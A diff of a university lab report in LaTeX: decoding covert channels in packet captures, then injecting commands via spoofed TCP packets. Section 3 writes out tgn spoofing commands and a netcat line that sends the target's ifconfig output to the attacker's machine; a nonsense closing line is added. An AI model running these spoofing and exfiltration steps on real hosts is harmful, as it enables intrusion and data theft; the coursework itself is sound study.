@@ -31,41 +31,43 @@ Vienna University of Technology } % Title
 %	SECTION 1
 %----------------------------------------------------------------------------------------
 \renewcommand{\arraystretch}{2} %Stretch rows
-\section*{Ex. 1.a - Capturing Traffic}
-By using ifconfig in the terminal the we found the local IP of the laptop:
+\section*{Exercise 1: Live Capturing of Covert Channels}
+
+\subsection*{Rep. 1.a - Capturing Traffic}
+By use of the terminal and the "ifconfig" command the local IP address of the confiscated notebook was found:
 \begin{verbatim}
 192.168.67.26
 \end{verbatim}
 
-\section*{Ex. 1.b - Presumed Perpetrator}
-The other other IPs in the network that communicate with 192.168.67.26 are:
+\subsection*{Rep. 1.b - Presumed Perpetrator}
+The IP addresses of the communication partners of the confiscated notebook with 192.168.67.26 are:
 \begin{verbatim}
 192.168.67.50 (presumably perpetrator) and 192.168.67.1 (presumably router)
 \end{verbatim}
 
-\section*{Ex. 1.c - Filter}
-The relevant data was filtered by source \& destination IP using wireshark:
+\subsection*{Rep. 1.c - Filter}
+The relevant data was filtered by source \& destination IP, using wireshark and exported:
 \begin{enumerate}
 	\item Filter in Wireshark using the command: (ip.src == 192.168.67.50) \&\& (ip.dst == 192.168.67.26)
 	\item Export to CSV: team02\_filtered.csv
 	\item Converted HEX to decimal via only\_decimal.sh shell script and stored into: team02\_filtered\_dec.csv
 \end{enumerate} 
 
-\section*{Ex. 1.d - Rapid Miner \& Discovery by Histogram}
-The histogram feature of Rapidminer was used to gain knowledge about the distribution of values in the messages.
+\subsection*{Rep. 1.d - Rapid Miner \& Discovery by Histogram}
+The histogram in Rapidminer was used to gain knowledge about the distribution of values in the messages.
 
 \begin{enumerate}
 	\item Imported team02\_filtered\_dec.csv into Rapidminer
-	\item by using two different fields for the protocols, we can see that all traffic is split up in TCP and UDP. UDP traffic is again split into UDP and NTP
-	\item TTL is constant at 64, so there is no entropy to store information
-	\item the source port is different for different streams, but not in a way that seems suitable for communication
-	\item TCP flags have virtually no distribution
+	\item By the use two protocol fields, it becomes visible that all traffic is split in TCP and UDP. The UDP traffic is then split into UDP and NTP
+	\item TTL is constant at 64, which means there is no entropy to store information
+	\item The source port varies for each stream, but not in any visible way that seems suitable for communication
+	\item The TCP flags have virtually no distribution
 \end{enumerate} 
 
-\section*{Ex. 1.e \& 1.f - Rapid Miner \& Discovery by Scatter Plot}
-Using the scatter plot feature of Rapidminer, no meaningful distribution was found, except in the "ip.id" field of the header over the time/packet number. The covert channel was discovered from varying ports on 192.168.67.50 to 192.168.67.26:123 via NTP/UDP.\\
+\subsection*{Rep. 1.e \& 1.f - Rapid Miner \& Discovery by Scatter Plot}
+Using the scatter plot feature in Rapidminer, no meaningful distribution was found, except in the "ip.id" field distributed over time/packet number. The covert channel was discovered from varying ports on 192.168.67.50 to 192.168.67.26:123 via NTP/UDP.\\
 
-Figure \ref{fig:RMscreen} shows a letter-cloud in the Scatter Plot between the ip.id values 10.000 and 32.500.
+Figure \ref{fig:RMscreen} shows letter-clouds in the scatter plot between the ip.id values 10.000 and 32.500.
 \begin{figure}[H] 
 	\centering % centering figure 
 	%\scalebox{0.5} % rescale the figure by a factor of 0.8 
@@ -74,29 +76,29 @@ Figure \ref{fig:RMscreen} shows a letter-cloud in the Scatter Plot between the i
 	\label{fig:RMscreen} % labeling to refer it inside the text
 \end{figure} 
 
-\section*{Ex. 1.g - Deployed Filter}
+\subsection*{Rep. 1.g - Deployed Filter}
 The deployed Wireshark filter to export the data is as follows:\\
 (ip.dst == 192.168.67.26) \&\& (ip.src == 192.168.67.50) \&\& (udp.dstport == 123)
 
-\section*{Ex. 1.h - Decoded Message}
+\subsection*{Rep. 1.h - Decoded Message}
 The following steps were used to clean up the information on the subliminal channel and decode the message:
 
 \begin{enumerate}
-\item Export only the ip.id field from Wireshark as .csv
-\item Open the .csv-File in Sublime Text 3, visually delete all superfluous information and extract only the bytes 4 and 5. 
-The string in the Wireshark output file of Line \#1 looks like this:
+\item Export the ip.id field from Wireshark as .csv
+\item Open the .csv-File in the program "Sublime Text 3" and visually delete all superfluous information and extract byte 4 and 5 only.
+\item Example: The string in the Wireshark output file of Line \#1 looks like the following:
 \begin{verbatim}
 "0x7e00 (32256)"
 \end{verbatim}
 
-After extracting the information, each line has just two Hex-characters left, exactly the information needed, for example  line \#1:
+After extracting the information, each line contains two Hex-characters with the relevant information. Line \#1:
 \begin{verbatim}
 7e
 \end{verbatim}
 
 \newpage
 
-After deleting the newlines, a string of hexadecimal characters is left:
+\item After deleting the newline characters, a hexadecimal string remains:
 
 \begin{verbatim}
 7e004e6f7631303a546f6d324a657272792c447374506f72743a3434332c63683a696e54544c73
@@ -112,53 +114,57 @@ After deleting the newlines, a string of hexadecimal characters is left:
 6d324a657272792c447374506f72743a3434332c63683a696e54544c732c5269676874
 \end{verbatim}
 
-which is a few repetitions of the following string with some newlines and random characters in between:
+This result represents several repetitions of the following string including newlines and few random characters:
 
 \begin{verbatim}
 4e6f7631303a546f6d324a657272792c447374506f72743a3434332c63683a696e54544c732c52
 696768742d4d5342
 \end{verbatim}
 
-Alternatively, Matlab or regular expressions could also have been used to filter out the Hex-values.
+Alternatively, Matlab or regular expressions could be used to filter the hexadecimal values.
 
-\item The hint provided in the exercise instructions pointed toward the fact that the encoding used was ASCII/8-Byte Hex. Python provides an easy way to decode this type of information:
+\item A hint provided in the instructions pointed to ASCII/8-Byte Hex encoding for the string. Python provides a simple decodes for this type of information:
 
 \begin{verbatim}
 decoded_string = encoded_string.decode("hex")
 \end{verbatim}
 \end{enumerate}
 
-The decoded message is as follows and refers to another covert channel:
+\subsection*{Exercise. 1 - Results}
+The decoded message provides information to yet another covert channel:
 \begin{verbatim}
 Nov10:Tom2Jerry,DstPort:443,ch:inTTLs,Right-MSB
 \end{verbatim}
 
-Specifically, the message conveys that there will be another covert channel from Tom (leaking machine) to Jerry (malicious laptop) on destination port 443 using the TTL-field, with the most significant bit (MSB) on the right. 
+
 
 
 
 %----------------------------------------------------------------------------------------
 %	SECTION 2
 %----------------------------------------------------------------------------------------
-
 \newpage
-\section*{Ex. 2 - New Covert Channel}
-Using the information from the first exercise, our team's pcap file was loaded into Wireshark and all traffic was filtered by destination port 443. Most of the traffic had TTL=64, but two different source IPs (.57, .58) were sending information to destination port 443 with wildly fluctuating TTLs between 37-59. The data was filtered by destination port 443 and source IPs .57 \& .58 and exported as a CSV-file for further analysis:
+\section*{Exercise 2 - A New Covert Channel}
+
+\subsection*{Rep. 2a - Interpret every word of the decoded message from exercise 1}
+This message is interpreted as follows. There will be another covert channel from Tom (leaking machine) to Jerry (malicious confiscated notebook) on destination port 443 using the TTL-field, with the most significant bit (MSB) on the right. 
+
+\subsection*{Rep. 2b - Finding the binary covert channel}
+Using the information from exercise 1, the team's pcap file was loaded into Wireshark and all traffic filtered by destination port 443. Most of the traffic shows TTL=64, however two source IP's (.57, .58) were sending information to destination port 443 with wildly fluctuating TTL-values between 37-59. The data was filtered by destination port 443 and source IP's (.57 \& .58) and exported as a CSV-file for further analysis:
 \begin{enumerate}
-\item Scatter plots of TTL over time in Rapid Miner showed that the distribution of values for the TTL looked like some kind of 'symbol-cloud', not unlike the letter-cloud from exercise 1.
-\item The tool provided by the tutors was used to analyze the symbol count of the two senders, arriving at approx. 13 and 15 symbols for source IP 57 \& 58 respectively.
+\item Scatter plots of the TTL-values over time in Rapid Miner show that the distribution of TTL-values look somewhat similar to a 'symbol-cloud', not unlike the letter-cloud from exercise 1.
+\item The tool provided by the tutors was used to analyze the symbol count of the two senders, arriving at approx. 13 and 15 symbols for the source IP's 57 \& 58
 \end{enumerate}
 
-At this point, some wrong conclusions were made implying suspicion about the possibility of another covert channel in the IP ID field, encrypted using the TTL-values as key. After reasoning that
+At this point, false conclusions were made implying suspicion about the possibility of another covert channel in the IP-ID field, encrypted using the TTL-values as key. After reasoning that:
 \begin{itemize}
-\item the data in the IP ID fields appears to be random,
-\item there already had already been a covert IP ID channel in exercise 1 and
-\item it was unsure whether or not the covert channel in the TTL field was supposed to be human-readable
+\item the data in the IP-ID fields appears to be random,
+\item there already had been a covert IP-ID channel in exercise 1 and
+\item it was unclear whether or not the covert channel in the TTL field was supposed to be human-readable
 \end{itemize}
-it was concluded that a) sending a key in the same packets would be unwise (which does not imply that it was not an option), and b) the attackers obviously (see Ex.1) violate Kerckhoff's principle and that it would therefore be pragmatic to examine the data in the TTL field by itself. 
+it was concluded that a) sending a key in the same packets would be unwise (which does not imply that it was not an option) and b) the attackers obviously violate Kerckhoff's principle (see Ex.1) and that it would therefore be pragmatic to examine the data in the TTL field by itself.\\
 
-\section*{Finding the binary covert channel}
-However, all our advances yielded nothing, so we went back to see if we had overlooked some piece of data that could be helpful. Following advice from the tutors, we had another look at the output of the multimodality estimation script:
+Since all advances yielded nothing, all steps were repeated to check for oversights and new pieces of evidence. Following the advice of the tutors, the output data of the multimodality estimation script was repadetly checked for anomalies:
 
 \begin{verbatim}
          Source		 Packets	 States	        Symbols
@@ -173,12 +179,12 @@ However, all our advances yielded nothing, so we went back to see if we had over
  192.168.202.001	      19	      1	     1.00000000
 \end{verbatim}
 
-After looking at the traffic in Wireshark and Rapidminer, it was apparent that there was a binary channel from 192.168.198.049 to 192.168.22.2:443 from several source ports, so we filtered the data in Wireshark using the following filter:
+After checking the traffic in Wireshark and Rapidminer, it became apparent that there was a binary channel from 192.168.198.049 to 192.168.22.2:443 from several source ports. The data was filtered in Wireshark using the following command:
 \begin{verbatim}
 (((((ip.src == 192.168.198.49) && (tcp.dstport == 443))) && (ip.dst == 192.168.22.2))))
 \end{verbatim}
 
-Then, as traffic was scattered around many different source ports, we looked at scatter plots of source ports versus packet number (see figures \ref{fig:RMscreen2} and \ref{fig:RMscreen3}). After determining the port in question, we refined our Wireshark filter:
+Due to the spreading of data around several source ports a closer look was taken at the scatter plots, specifically source ports over packet number. (see figure \ref{fig:RMscreen2} and figure \ref{fig:RMscreen3}). After determining the port in question, the Wireshark filter was refined to the following:
 \begin{verbatim}
 ((((((ip.src == 192.168.198.49) && (tcp.dstport == 443))) && (ip.dst == 192.168.22.2)))) 
 && (tcp.srcport == 51783)
@@ -188,24 +194,24 @@ Then, as traffic was scattered around many different source ports, we looked at 
 	\centering % centering figure 
 	%\scalebox{0.5} % rescale the figure by a factor of 0.8 
 	{\includegraphics[width=\textwidth]{images/ex2_scatter_src_no_49_2_wide.png}} % importing figure
-	\caption{Rapidminer Scatter Plot for source port vs. packet no for a wide range of packets} 
+	\caption{Rapidminer Scatter Plot for source port vs. packet no. for a wide range of packets} 
 	\label{fig:RMscreen2} % labeling to refer it inside the text
 \end{figure} 
 \begin{figure}[H] 
 	\centering % centering figure 
 	%\scalebox{0.5} % rescale the figure by a factor of 0.8 
 	{\includegraphics[width=\textwidth]{images/ex2_scatter_src_no_49_2_tight.png}} % importing figure
-	\caption{Rapidminer Scatter Plot for source port vs. packet no, zoomed in on an anomalous burst} 
+	\caption{Rapidminer Scatter Plot for source port vs. packet no. zoomed in on an anomalous burst} 
 	\label{fig:RMscreen3} % labeling to refer it inside the text
 \end{figure} 
 
 
 \newpage
-\section*{Decoding the binary channel}
-We then took the following steps to determine whether this was the traffic we were looking for and tried to decode it:
+\subsection*{Exercise 2 - Decoding the binary channel}
+The following steps were taken to determine whether the captured stream contains the desired traffic for decoding:
 \begin{itemize}
-\item Export TTL values with the filter applied as .csv file to get a list of 56s and 64s.
-\item Convert the values to zeros and ones using LibreOffice's spreadsheet program (Excel equivalent) and string the values together to get a bitstring: 
+\item Export TTL values with the filter applied as .csv file to get a list of all 56s and 64s.
+\item Convert the values to 0 and 1 using the LibreOffice's spreadsheet program (Excel equivalent) and string the values together to return the bitstring: 
 \begin{verbatim}
 01111110000000001010111001011100110011100001011010000110101
 10110100101100100111000110100000011100101110001000110100001
@@ -220,33 +226,34 @@ We then took the following steps to determine whether this was the traffic we we
 10111100101100101000110100000011100101110011000110100001101
 101011010100110
 \end{verbatim}
-This binary traffic looks very promising already, because of what looks like a symmetric initialization sequence (01111110) and a buffer before the payload starts (00000000).
+This binary traffic looks promising, because of what looks like a symmetric initialization sequence (01111110) and a buffer sequence before the payload starts (00000000).
 
-\item Reverse the bitorder using Python. Since ASCII encoding has the MSB on the left, but we know from the hint in exercise 2 that it is Right-MSB, we have to reverse the bitorder. We copied the payload into a variable called string and reversed it using string[::-1]
-\item Convert this to ASCII using an online decoder. This yields the desired text, but with backwards letter-order
-\item To finalize and make it readable, copy back into Python and reverse the symbol-order again to get the "decoded" text:
+\item Reversing the bitorder using Python since ASCII encoding has the MSB on the left. From the hint in exercise 2 it is known that when Right-MSB is given, the bitorder order inside the bytes has to be reversed. The payload was copied into a variable called string and reversed by using string[::-1]. This was automized for every byte.
+\item Convert the resulting bitstring to ASCII using an online decoder. This yields the desired text, but with backwards letter-order
+\item To finalize the text it was copied back into Python and reverse the symbol-order again to receive the "decoded" text:
 \end{itemize}
 
 \begin{verbatim}
 'u:shamir,p:badpw,u:gladOS,p:cake,u:batma,p:robin u:shamir,p:badpw,u:gladOS,p:cake'
 \end{verbatim}
 
-Obviously, this is a list of user/password combinations. 
+The result is a list of user/password combinations.
 
 \newpage
-\section*{Ex. 3 - Using Covert Channels}
+\section*{Exercise 3 - Using Covert Channels}
 
-By looking at the traffic appearing in the Wireshark capture on the second screen, we found that the Jerry's machine has IP address 192.168.67.26, and using ifconfig we determined that our machine has IP 192.168.67.31.
+By looking at the traffic appearing in the Wireshark capture on the second screen, Jerry's machine was found to have the IP address 192.168.67.26, and by using ifconfig the local IP of Tom (192.168.67.31) has been determined.
 
-We use the shell to ping the other computer:
+The terminal was used to ping the other computer:
 \begin{verbatim}
 ping 192.168.67.26
 \end{verbatim}
 
-The ping attempt clearly showed up on the other machine, as could be seen in Wireshark. However, the ping is not returned. Our conclusion is that some kind of ingress filtering is happening by use of firewall software in the application layer. If the filtering had happened in the network layer, the packet would not have appeared in the Wireshark capture in the first place. 
-\\
-\section*{Manipulating TCP packets to execute commands}
-In order to execute commands on Jerry's computer, spoofed packets were sent to the three web servers using tgn. We used the following commands in the shell (see table for the specific field values):
+\subsection*{Rep. 3b - Firewall}
+The ping attempt clearly appeared on the other machines wire shark screen. However, the ping was not returned. The conclusion drawn from this is that ingress filtering may be responsible by the use of firewall software in the application layer. If the filtering had been conducted in the network layer, the ping would not have appeared on the Wireshark capture as incoming ping in the first place.
+
+\subsection*{Rep. 3c - Manipulating TCP packets to execute commands}
+In order to execute commands on Jerry's computer, spoofed packets were sent to the three web servers using tgn. The following commands were used in the terminal (see table for the specific field values):
 \begin{verbatim}
 team02@ubuntu:~$ sudo tgn -v "ip(src = 192.168.67.26, dst = 192.168.67.220, ttl=64)/
 tcp(src = 8888, dst = 80, syn, seq=107)"
@@ -257,11 +264,10 @@ Sent 1 packets.
 team02@ubuntu:~$ sudo tgn -v "ip(src = 192.168.67.26, dst = 192.168.67.220, ttl=64)/
 tcp(src = 8888, dst = 80, syn, seq=12)"
 \end{verbatim}
-The option -v outputs the status of the program verbosely, so we can see what happens (whether or not packets have been sent). 
-
+The option -v outputs the status of the program verbosely, so whether or not packets have been sent can be seen by the users. 
 
 \begin{center}
-    \begin{tabular}{ | 1 | l | l | l | 1 | l | l | l | 1 | }
+    \begin{tabular}{ | l | l | l | l | l | l | l | l | }
     \hline
     Src. IP & Dst. IP & TTL & Src. Port & Dst. Port & seq & ASCII Dec & ASCII\\ \hline
     192.168.67.26 & 192.168.67.200 & 64 & 8888 & 80 & 107 & 108 & l\\ \hline
@@ -270,25 +276,25 @@ The option -v outputs the status of the program verbosely, so we can see what ha
     \end{tabular}
 \end{center}
 
-The ID \& acknowledge sequence values were left out because they weren't needed explicitly and tgn would fill in default values automatically. After experimenting with this functionality, we discovered that IPs would be banned from sending for 120 seconds if they sent more than 10 consecutive packets to the computer.
+The ID \& acknowledge sequence values were left out because they are not required explicitly and tgn would fill in default values automatically. After experimenting with this functionality, we discovered that IP's would be banned from sending for 120 seconds by the receiving PC in case they sent more than 10 consecutive packets to the computer.
 
-\section*{Running ifconfig and transferring data to our computer}
-First, we set up netcat to listen on port 1024 on our computer using the command:
+\subsection*{Rep. 3d - Running ifconfig and transferring data to the Tom-PC}
+First, netcat was set up to listen on port 1024 on the Tom-computer using the command:
 
 \begin{verbatim}
 netcat -l 1024
 \end{verbatim}
 
-The command we would have to execute on the other computer was:
+The command the needed to be executed on the other computer is:
 
 \begin{verbatim}
 ifconfig | netcat 192.168.67.31 1024
 \end{verbatim}
 
-Then, using the capabilities explored in the previous section, we looked up the decimal values of the ASCII characters of the command, and wrote bash script that executed the command for each character, and added a carriage return in the end to execute the command. In order to avoid being banned by Jerry's computer, the destination IPs, and therefore the spoofed source IPs were alternated for each line. (see the file netcat\_ifconfig.sh in the directory workfiles/Ex3)
+Using the capabilities explored in the previous section, the code was pieced together by using the decimal values of the ASCII characters of the command, and wrote bash script that executed the command for each character. A carriage return was included at the end to execute the command. In order to avoid being banned by Jerry's computer, the destination IPs, and therefore the spoofed source IPs were alternated for each line. (see the file netcat\_ifconfig.sh in the directory workfiles/Ex3)
 
 \newpage
-After running the script we saw the ifconfig information of Jerry's computer appear on our Terminal:
+After running the script the ifconfig information of Jerry's computer can be seen on Tom's Terminal:
 
 \begin{verbatim}
 eth0      Link encap:Ethernet  HWaddr 94:de:80:6f:2e:55  
@@ -318,4 +324,7 @@ p3p1      Link encap:Ethernet  HWaddr 94:de:80:6f:2e:45
           RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
           Interrupt:19 
 \end{verbatim}
+
+The conclusion after running the script is aaaaaaaaaaaaaaaaaaaa    --- live long and prosper
+
 \end{document}
